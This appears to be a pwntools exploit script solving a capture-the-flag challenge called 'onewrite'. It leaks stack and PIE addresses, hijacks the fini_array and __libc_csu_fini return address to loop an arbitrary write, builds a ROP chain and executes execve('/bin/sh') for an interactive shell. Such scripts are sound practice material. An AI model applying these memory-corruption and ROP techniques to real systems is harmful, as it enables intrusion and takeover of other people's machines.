
from pwn import *
import time

target = process('./onewrite')
elf = ELF('onewrite')

# helper function to send the address and data that we are overwriting 
# since we create a loop that requires us to do this many times
def writeTo(addr, data):
    print(target.recvuntil(b"address :"))
    target.send(str(addr))
    print(target.recvuntil(b"data :"))
    target.send(data)

# when we request a leak, this saves the leak    
def leak(integer):
    print(target.recvuntil(b">"))
    target.sendline(str(integer))
    leakage = target.recvline()
    return int(leakage, 16)


# store and request leak
leakStack = leak(1)

#do_leak returns 24 bytes after the provided leak
doLeakret = leakStack + 24

#libc_csu_fini returns at the leaked stack address minus 72
libcCsuFiniret = leakStack - 72

# overwrite last byte, previously 0x09 so that we go further back to rerun doLeak
writeTo(str(doLeakret), p8(0x04))

# now leak pie address

leakPie = leak(2)
#gdb.attach(target, gdbscript = "b *(do_overwrite + 81)")

#now calculate offsets on pie table
#the fini_array_entry is important because this is an array of 
# addresses that are called when exiting so we can overwrite these
# The libc_csu_fini is called and we overwrite its return address with the start of it
# so that it loops back around. libc_csu_fini also calls the fini_array_entry 
# so if we overwrite these entries with do_leak, we can get an infinite 
# loop of the do_leak function
pie = leakPie - elf.symbols['do_leak']
overWrite = pie + elf.symbols['do_overwrite']
csu_fini = pie + elf.symbols['__libc_csu_fini']
finiArr = pie + elf.symbols['__do_global_dtors_aux_fini_array_entry']

# now that we know location of methods, can overwrite their return addresses to create loop of overwrites
writeTo(str(doLeakret), p8(0x04))

leak(1)

#now overwrite entries 
# entries in array are called in reverse order so write to last entry first
writeTo(str(finiArr + 8), p64(overWrite))

# we have overwritten the array to go back to overwrite, so we can overwrite again
writeTo(str(finiArr), p64(overWrite))

#now with this new overwrite, we will make sure that the csu_fini stack return address returns to csuFini which calls the finiArr again!
#gdb.attach(target, gdbscript = "b *(do_overwrite + 81)")
writeTo(str(libcCsuFiniret), p64(csu_fini))

#now it keeps looping back to the overwrite and we may begin creating our ROP chain using the pie address

# increment by 8 because we are looping around again and we pop 8 bytes
# so the stack return address of libc_csu_fini increases by 8 every iteration
libcCsuFiniret += 8

popRdi = pie + 0x84fa
popRsi = pie + 0xd9f2
popRdx = pie + 0x484c5
popRax = pie + 0x460ac
syscall = pie + 0x917c
binsh = leakPie + 0x2aa98b

# add 0x88 to sp, pop rbx, ret
addSp = pie + 0x8cd1

ropStart = leakStack + 0x88

# helper function for the loop of overwriting
# for our rop chain
def ropLoop(addr, data):
    global libcCsuFiniret
    # overwrite where we want with what we want
    writeTo(addr, p64(data))
    # must overwrite libc ret address because the location changes by 8 every time
    writeTo(str(libcCsuFiniret), p64(csu_fini))
    
    libcCsuFiniret += 8
    

# send "/bin/sh" first and save it to bss
ropLoop(binsh, u64(b"/bin/sh\x00"))


ropLoop(ropStart, popRdi)
ropLoop(ropStart + 8, binsh)
ropLoop(ropStart + 16, popRsi)
ropLoop(ropStart + 24, 0)
ropLoop(ropStart + 32, popRdx)
ropLoop(ropStart + 40, 0)
ropLoop(ropStart + 48, popRax)
ropLoop(ropStart + 56,  0x3b)
# gdb.attach(target, gdbscript = "b *(do_overwrite)")
ropLoop(ropStart + 64, syscall)

# now just need one overwrite to change sp to start of rop by changing return address of overwrite to the gadget
print("start of rop:" + hex(ropStart))
print("stack leak: " + hex(leakStack))

writeTo(str(leakStack - 16), p64(addSp))

target.interactive()
        





        
        
